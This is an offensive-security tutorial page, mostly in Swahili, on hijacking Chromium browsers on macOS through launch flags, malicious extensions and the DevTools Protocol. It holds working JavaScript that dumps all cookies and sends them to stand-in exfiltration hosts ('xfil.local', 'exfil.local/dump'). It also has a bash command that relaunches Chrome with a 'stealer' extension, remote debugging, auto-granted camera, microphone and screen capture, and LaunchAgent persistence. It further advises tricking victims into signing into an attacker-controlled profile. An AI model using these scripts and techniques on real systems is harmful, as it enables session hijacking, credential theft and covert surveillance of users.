# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Chromium-based browsers kama Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, na Opera wote hutumia switches za mstari wa amri, faili za preference, na interfaces za automatisering za DevTools zilizo sawa. Kwenye macOS, mtumiaji yeyote mwenye ufikiaji wa GUI anaweza kumaliza kikao cha kivinjari kinachoendesha na kukifungua tena kwa flags, extensions, au endpoints za DevTools chochote ambazo zinafanya kazi kwa entitlements za lengo.

#### Kuanza Chromium kwa flags maalum kwenye macOS

macOS inahifadhi mfano mmoja wa UI kwa kila profile ya Chromium, hivyo instrumentation kawaida inahitaji kufunga kivinjari kwa nguvu (kwa mfano kwa `osascript -e 'tell application "Google Chrome" to quit'`). Washambulizi kwa kawaida hurudia kuanzisha kwa `open -na "Google Chrome" --args <flags>` ili waweze kuingiza arguments bila kubadilisha app bundle. Kuweka amri hiyo ndani ya user LaunchAgent (`~/Library/LaunchAgents/*.plist`) au login hook kunahakikisha kivinjari kilichotumiwa kinarudishwa kuanza baada ya reboot/logoff.

#### `--load-extension` Flag

Flag `--load-extension` inaburuta unpacked extensions (paths zilizoandikwa kwa koma). Iambatanishe na `--disable-extensions-except` ili kuzuia extensions halali huku ukilazimisha payload yako tu iendeshe. Malicious extensions zinaweza kuomba ruhusa zenye athari kubwa kama `debugger`, `webRequest`, na `cookies` ili pivot kwenda kwenye DevTools protocols, patch CSP headers, downgrade HTTPS, au exfiltrate session material mara tu kivinjari kinapoanza.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Switch hizi zinafichua Chrome DevTools Protocol (CDP) juu ya TCP au pipe ili tooling ya nje iweze kumsukuma kivinjari. Google iliona matumizi mengi ya infostealer ya interface hii na, kuanzia Chrome 136 (Machi 2025), switches hizi zinapuuzwa kwa profile ya default isipokuwa kivinjari kimezinduliwa na `--user-data-dir` isiyo ya kawaida. Hii inalazimisha App-Bound Encryption kwenye profiles halisi, lakini washambulizi bado wanaweza kuanzisha profile safi, kulazimisha mwathirika kuthibitisha ndani yake (phishing/triage assistance), na kuvuna cookies, tokens, device trust states, au WebAuthn registrations kupitia CDP.

#### `--user-data-dir` Flag

Flag hii inaelekeza profile nzima ya kivinjari (History, Cookies, Login Data, Preference files, n.k.) kwenye path inayodhibitiwa na mshambuliaji. Ni lazima wakati wa kuunganisha builds za kisasa za Chrome na `--remote-debugging-port`, na pia inafanya profile iliyoharibika iwe izoleted ili uweze kuacha faili za `Preferences` au `Secure Preferences` zilizopangwa mapema ambazo zitatamaga security prompts, kujisakinisha extensions moja kwa moja, na kubadilisha default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Switch hii inazuiya prompt ya ruhusa ya camera/mic hivyo ukurasa wowote unaoitisha `getUserMedia` unapata upatikanaji mara moja. Imeunganishwa na flags kama `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, au amri za CDP `Browser.grantPermissions` ili kunasa kimya audio/video, kushiriki dawati, au kukidhi ukaguzi wa ruhusa za WebRTC bila mwingiliano wa mtumiaji.

## Remote Debugging & DevTools Protocol Abuse

Mara tu Chrome inapozinduliwa tena na `--user-data-dir` maalum na `--remote-debugging-port`, unaweza kuungana kupitia CDP (kwa mfano kupitia `chrome-remote-interface`, `puppeteer`, au `playwright`) na kuandika skripti za workflows zenye ruhusa za juu:

- **Cookie/session theft:** `Network.getAllCookies` na `Storage.getCookies` hurudisha HttpOnly values hata wakati App-Bound encryption kawaida ingezuia ufikiaji wa filesystem, kwa sababu CDP inaomba kivinjari kinachoendeshwa ki-decrypt.
- **Permission tampering:** `Browser.grantPermissions` na `Emulation.setGeolocationOverride` zinakuwezesha kuepuka camera/mic prompts (hasa ikichanganywa na `--use-fake-ui-for-media-stream`) au kupotosha ukaguzi wa usalama unaotegemea eneo.
- **Keystroke/script injection:** `Runtime.evaluate` inatekeleza arbitrary JavaScript ndani ya tab inayofanya kazi, ikiruhusu credential lifting, DOM patching, au kuingiza persistence beacons zinazodumu baada ya navigation.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` na `Fetch.enable` zinakamata authenticated requests/responses kwa wakati halisi bila kugusa disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Kwa sababu Chrome 136 inazuia CDP kwenye profile ya default, kunakili/kubandikisha saraka ya mwathiriwa iliyopo `~/Library/Application Support/Google/Chrome` kwenye path ya staging haizalishi tena cookies zilizofumbuliwa. Badala yake, social-engineer mtumiaji ili aingie ndani ya instrumented profile (mfano, kikao cha msaada "helpful") au chukua token za MFA zinapokuwa zinatembea kupitia CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

Utafiti wa 2023 "Chrowned by an Extension" ulionyesha kwamba extension ya uharibifu inayotumia `chrome.debugger` API inaweza kuambatisha kwenye tab yoyote na kupata nguvu sawa za DevTools kama `--remote-debugging-port`. Hii inavunja dhana za awali za kutengwa (extensions zinabaki katika muktadha wao) na inaruhusu:

- Kunyang'anya kwa siri cookies na credentials kwa kutumia `Network.getAllCookies`/`Fetch.getResponseBody`.
- Marekebisho ya ruhusa za tovuti (camera, microphone, geolocation) na bypass ya security interstitial, kuruhusu kurasa za phishing kuiga madialog ya Chrome.
- On-path tampering ya onyo za TLS, downloads, au prompts za WebAuthn kwa kuendesha kwa programu `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, au `Security.handleCertificateError`.

Pakia extension kwa `--load-extension`/`--disable-extensions-except` ili hakuna mwingiliano wa mtumiaji utakaohitajika. Skripti ndogo ya background inayofanya API hii kuwa silaha inaonekana kama hii:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
The extension can also subscribe to `Debugger.paused` events to read JavaScript variables, patch inline scripts, or drop custom breakpoints that survive navigation. Because everything runs inside the user's GUI session, Gatekeeper and TCC are not triggered, making this technique ideal for malware that already achieved execution under the user context.

### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Huendesha uzinduzi wa Chromium kiotomatiki kwa kutumia payload extensions na hutoa interactive CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Zana zinazofanana zinazolenga traffic interception na browser instrumentation kwa watendaji wa macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Maktaba ya Node.js ya kuandika scripts za Chrome DevTools Protocol dumps (cookies, DOM, permissions) mara tu instance yenye `--remote-debugging-port` itakapokuwa hai.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pata mifano zaidi katika viungo vya zana.

## Marejeo

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
